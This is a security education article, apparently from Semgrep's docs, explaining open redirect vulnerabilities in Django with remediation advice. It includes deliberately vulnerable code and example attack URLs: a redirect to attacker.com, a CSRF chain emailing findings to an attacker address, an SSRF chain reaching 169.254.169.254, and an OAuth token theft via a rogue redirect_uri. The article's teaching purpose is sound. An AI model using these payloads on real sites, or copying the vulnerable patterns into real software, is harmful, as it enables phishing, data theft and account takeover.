---
title: Open Redirect
description: Learn about Open Redirect vulnerabilities
hide_title: false
displayed_sidebar: learnSidebar
slug: /learn/vulnerabilities/open-redirect
---

# Open Redirect

You receive a link in your email inbox from a social media website, it’s legitimate, the domain is correct and you login successfully. But instead of being redirected to the home screen, you find yourself on a phishing website. That’s what an open redirect can look like from the victim’s perspective.

Redirect logic is common in web applications. Login flows, payment gateways, and content sharing often rely on redirects. A successful open redirect doesn’t just fool a single user, it undermines the integrity of your domain, erodes user trust, and exposes your business to phishing campaigns. While open redirects are sometimes dismissed as “low-severity,” attackers can often chain them into something far worse. As we’ll see in this article, the impact ranges from stealing OAuth tokens for account takeover, to bypassing CSRF protections, to escalating into XSS or [SSRF](/docs/learn/vulnerabilities/server-side-request-forgery). In other words, what looks like a harmless detour can become the entry point to a critical breach.

In this article, we will explore the fundamentals of open redirects, look in some more detail how attackers exploit them and escalate them. We’ll also show you what vulnerable code looks like, and finish with clear recommendations to reduce your risk.

## What Are Open Redirects?

Redirects are a standard feature of web applications. They were designed to solve practical problems, such as sending a user back to the page they came from, directing them to a login page, or moving them to a new section of a site after an update. In short, redirects help keep the user experience smooth when content or workflow changes.

An **Open Redirect** risk appears when a redirect destination is built directly from user input. For example, if a program takes a value from a query parameter and uses it as the redirect target, it effectively gives control of navigation to whoever provides that input. Features like flexible URL parsing or automatic redirect handling can increase the exposure, because they make it easier for an attacker to supply their own links.


### Exploiting Open Redirect Vulnerabilities

One of the most straightforward attacks is **redirecting users to a malicious website**. Imagine an application that redirects users to a protected page. The application may redirect the users to the login page and send the original protected page as a query parameter to redirect to after logging in, such as:

```
https://semgrep.dev/login?redirect_url=https://semgrep.dev/my-dashboard
```

If the program redirects to whatever appears in `redirect_url`, an attacker can replace it with a malicious destination:

```
https://semgrep.dev/login?redirect_url=https://attacker.com/my-semgrep-dashboard
```

The user sees the trusted domain `semgrep.dev` in their browser before the redirect happens. By the time they land on the attacker’s page, it may look like a legitimate login or checkout page designed to steal credentials.

## Common Open Redirect Attacks

To an attacker, an open redirect is often considered low-hanging fruit. However, with the increased complexity of modern applications, it’s often become possible to escalate these to higher-severity security issues. That’s why open redirects shouldn’t be dismissed as harmless. In practice, they’re often used as building blocks in larger attacks such as phishing, session fixation, Cross-Site Scripting (XSS), [Server-Side Request Forgery (SSRF)](/docs/learn/vulnerabilities/server-side-request-forgery), or Cross-Site Request Forgery (CSRF). Here’s a few examples.

### Chaining with CSRF

This Python example with Django demonstrates combining an open redirect with a cross-site request forgery:

```python
from django.http import HttpResponseRedirect, JsonResponse

def redirect_view(request):
    url = request.GET.get("url")
    return HttpResponseRedirect(url)

def export_semgrep_findings(request):
    if request.method == "GET":
        project_id = request.GET.get("id")
        email = request.GET.get("email")
        export_and_send_semgrep_findings(project_id, email)
        return JsonResponse({"success": True, "message": "Findings sent"})
```

In this fictional example, we notice an open redirect in the `redirect_view` . Additionally, if CSRF protection is not enabled globally, the `export_semgrep_findings` function is vulnerable to a CSRF attack. The following malicious link would allow an attacker to trick a logged-in user into triggering a request that exports sensitive Semgrep findings from their project and emails them straight to the attacker.

```python
/redirect?url=/api/project/export?id=1234&email=pieter@attacker.com
```

### Chaining with SSRF

Even if an application tries to restrict which hosts it can fetch from, an open redirect can bypass those defenses. Suppose `semgrep.dev` has an image loader that only allows fetching from `*.semgrep.dev` , the implementation might look something like the Python code snippet below.

```python
import requests
from urllib.parse import urlparse
from django.http import JsonResponse

def image_loader(request):
    url = request.GET.get("url")
    parsed = urlparse(url)

    if not parsed.hostname.endswith("semgrep.dev"):
        return JsonResponse({"error": "Invalid host"}, status=403)
    try:
        resp = requests.get(url) 
        return JsonResponse({"image_data": resp.text})
    except Exception:
        return JsonResponse({"error": "Failed to fetch"}, status=500)
```

An attacker can combine this with the open redirect endpoint:

```
/api/image-loader?url=http://semgrep.dev/redirect?url=http://169.254.169.254/data
```

Because the `requests` library automatically follows redirects, the server fetches data from internal services not intended to be reachable by users, effectively turning the open redirect into an SSRF vector.

### Account takeover with OAuth

Open redirects are especially dangerous when used in authentication flows. For example, in a simplified OAuth endpoint:

```python
from django.http import HttpResponseRedirect

def oauth_start(request):
    cid = request.GET.get("client_id")
    uri = request.GET.get("redirect_uri")
    url = f"https://oauth.provider.com/auth?client_id={cid}&redirect_uri={uri}&response_type=token"
    return HttpResponseRedirect(url)
```

If the redirect URI is not validated, an attacker can supply a URL they control:

```
/api/oauth/start?client_id=1234&redirect_uri=https://attacker.com/callback
```

When the OAuth provider completes the login flow, it sends the victim’s access token to the attacker’s server. With this token, the attacker can impersonate the victim and take over their account.


## Detecting Open Redirect Vulnerabilities in Your Code

We’ve already seen a number of Open Redirect vulnerabilities above. To find similar issues in your code, you need to look for places where user-supplied data can control the URL of a redirect. The simplest, yet surprisingly common, data flow is when a query parameter is used to supply the redirect URL entirely.

```python
from django.http import HttpResponseRedirect

def index(request):
    user_supplied_url = request.GET["redirect_url"]
    return HttpResponseRedirect(user_supplied_url)
```

The program reads the value of `redirect_url` from the query string and redirects the user to it. But because this value comes directly from user input, an attacker can supply any domain they want. The server does not verify if the destination is trusted, which makes this a textbook open redirect.

To detect these issues in your own code, you need to trace the flow of user-controlled input into redirect functions. This can be challenging to do manually in larger projects, because input may pass through several variables before being used. Semgrep can identify when data from request parameters or headers flows into redirect functions. It highlights risky cases while ignoring safe patterns, such as when the redirect target is built from fixed routes using mapping tables like [Django’s `reverse()` function.](https://docs.djangoproject.com/en/5.2/ref/urlresolvers/)


## Recommendations and Mitigations

The most effective defense is to ensure that user input never directly controls the full redirect destination. 

If your application needs to support dynamic redirects, restrict them to a predefined list of safe domains or internal paths. Check if your library or framework provides utility functions to safely redirect to known paths, such as [Django’s `reverse()` function.](https://docs.djangoproject.com/en/5.2/ref/urlresolvers/) 

```python
from django.http import HttpResponseRedirect, HttpResponseBadRequest
from django.urls import reverse, NoReverseMatch

def safe_redirect(request):
    target = request.GET.get("next")

    try:
        # reverse() only resolves to registered Django views
        safe_url = reverse(target)
        return HttpResponseRedirect(safe_url)
    except NoReverseMatch:
        return HttpResponseBadRequest("Invalid redirect target")

    return HttpResponseBadRequest("Redirect not allowed")
```

If you must implement the allowlist yourself, be careful to implement the checks correctly. Attackers have many workarounds for common implementations. Take a look at [Portswigger’s url validation bypass cheat sheet](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet) to see how creative they can get.

Even, then, if you correctly restrict the URL, as we’ve seen in the example attacks, redirects to restricted domains can still be useful to an attacker turning them into SSRF vectors.

If it is not possible to use any of the above defenses, another useful approach is to notify the user whenever they are leaving your site. Showing the external domain clearly gives them a chance to recognize when something looks suspicious.

## Conclusion

Open redirects may look like a minor detail, but they can have major consequences. When untrusted input controls navigation, attackers can exploit the trust users place in your domain and redirect them to harmful destinations.

In this article, we covered what redirects are, how attackers abuse them, how to spot vulnerable code, and what practical steps you can take to avoid them. The takeaway is simple: never let raw user input decide where your program redirects.

Redirect logic will always be part of building modern applications, but with careful validation and the help of tools like Semgrep, you can keep your projects safe from this subtle but impactful issue.